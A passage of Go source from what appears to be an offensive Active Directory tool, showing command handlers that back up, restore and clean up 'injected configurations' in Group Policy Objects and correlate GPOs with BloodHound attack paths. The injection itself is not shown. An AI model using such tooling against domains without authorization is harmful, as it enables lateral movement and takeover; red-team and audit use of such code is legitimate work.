	backupPath, err := gpo.BackupGPO(targetGPO.GUID, gpoPath, backupDir)
	if err != nil {
		return fmt.Errorf("backup GPO: %w", err)
	}

	fmt.Printf("[+] GPO backed up to: %s\n", backupPath)
	return nil
}

func runGPORestore(cmd *cobra.Command) error {
	gpoName, _ := cmd.Flags().GetString("gpo")
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	backupDir, _ := cmd.Flags().GetString("backup-dir")

	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}
	if sysvolPath == "" {
		return fmt.Errorf("--sysvol-path is required")
	}

	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	var targetGPO *gpo.GPO
	for i := range gpos {
		if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
			targetGPO = &gpos[i]
			break
		}
	}
	if targetGPO == nil {
		return fmt.Errorf("GPO not found: %s", gpoName)
	}

	fmt.Printf("[*] Restoring GPO %s from backup\n", targetGPO.Name)
	if err := gpo.RestoreGPO(targetGPO.GUID, sysvolPath, backupDir); err != nil {
		return fmt.Errorf("restore GPO: %w", err)
	}

	fmt.Printf("[+] GPO restored successfully\n")
	return nil
}

func runGPOCleanup(cmd *cobra.Command) error {
	gpoName, _ := cmd.Flags().GetString("gpo")
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	backupDir, _ := cmd.Flags().GetString("backup-dir")

	if gpoName == "" {
		return fmt.Errorf("--gpo is required")
	}
	if sysvolPath == "" {
		return fmt.Errorf("--sysvol-path is required")
	}

	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	var targetGPO *gpo.GPO
	for i := range gpos {
		if gpos[i].Name == gpoName || gpos[i].GUID == gpoName {
			targetGPO = &gpos[i]
			break
		}
	}
	if targetGPO == nil {
		return fmt.Errorf("GPO not found: %s", gpoName)
	}

	fmt.Printf("[*] Cleaning up injected configurations from GPO %s\n", targetGPO.Name)
	if err := gpo.CleanupGPO(targetGPO.GUID, sysvolPath, backupDir); err != nil {
		return fmt.Errorf("cleanup GPO: %w", err)
	}

	fmt.Printf("[+] GPO cleanup complete\n")
	return nil
}

func runGPOBloodHound(cmd *cobra.Command) error {
	sysvolPath, _ := cmd.Flags().GetString("sysvol-path")
	bhOutput, _ := cmd.Flags().GetString("bh-output")

	if sysvolPath == "" {
		return fmt.Errorf("--sysvol-path is required")
	}
	if bhOutput == "" {
		bhOutput = "gpo_bloodhound.json"
	}

	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	fmt.Printf("[*] Exporting %d GPO(s) to BloodHound format\n", len(gpos))
	if err := gpo.ExportGPOsToBloodHound(gpos, bhOutput); err != nil {
		return fmt.Errorf("export BloodHound: %w", err)
	}

	fmt.Printf("[+] BloodHound data written to: %s\n", bhOutput)
	fmt.Println("[*] Import into BloodHound with: bloodhound-python -c All -u user -p pass -d corp.local -dc dc01.corp.local")

	return nil
}

func runGPOBloodHoundImport(cmd *cobra.Command) error {
	bhInput, _ := cmd.Flags().GetString("bh-input")

	if bhInput == "" {
		return fmt.Errorf("--bh-input is required")
	}

	cfg := buildGPOConfig(cmd)
	if err := pki.ValidateConnectionConfig(cfg); err != nil {
		return err
	}
	ctx := context.Background()
	conn, err := gpo.ConnectLDAP(ctx, cfg)
	if err != nil {
		return fmt.Errorf("LDAP connect: %w", err)
	}
	defer conn.Close()

	gpos, err := gpo.EnumerateGPOs(ctx, cfg, conn)
	if err != nil {
		return fmt.Errorf("enumerate GPOs: %w", err)
	}

	fmt.Printf("[*] Importing BloodHound data from: %s\n", bhInput)
	bhData, err := gpo.ImportBloodHoundJSON(bhInput)
	if err != nil {
		return fmt.Errorf("import BloodHound: %w", err)
	}

	results := gpo.CorrelateGPOsWithBloodHound(gpos, bhData)

	fmt.Printf("\n[+] Correlated %d GPO(s) with BloodHound data\n\n", len(results))
	for _, r := range results {
		fmt.Printf("  GPO: %s (%s)\n", r.GPOName, r.GPOGUID)
		fmt.Printf("    Affected Users: %d\n", len(r.AffectedUsers))
		fmt.Printf("    Affected Computers: %d\n", len(r.AffectedComputers))
		fmt.Printf("    Writable By: %d\n", len(r.WritableBy))
		if len(r.AttackPaths) > 0 {
			fmt.Printf("    Attack Paths:\n")
			for _, path := range r.AttackPaths {
				fmt.Printf("      - %s\n", path)
			}
		}
		fmt.Println()
	}

	return nil
}

func runGPOAudit(cmd *cobra.Command) error {
	backupDir, _ := cmd.Flags().GetString("backup-dir")
	auditOutput, _ := cmd.Flags().GetString("audit-output")

	if auditOutput == "" {
		auditOutput = "gpo_audit_log.md"
	}

	fmt.Printf("[*] Exporting audit log to: %s\n", auditOutput)
	if err := gpo.ExportAuditLog(backupDir, auditOutput); err != nil {
		return fmt.Errorf("export audit log: %w", err)
	}

	fmt.Printf("[+] Audit log written to: %s\n", auditOutput)
	return nil
}
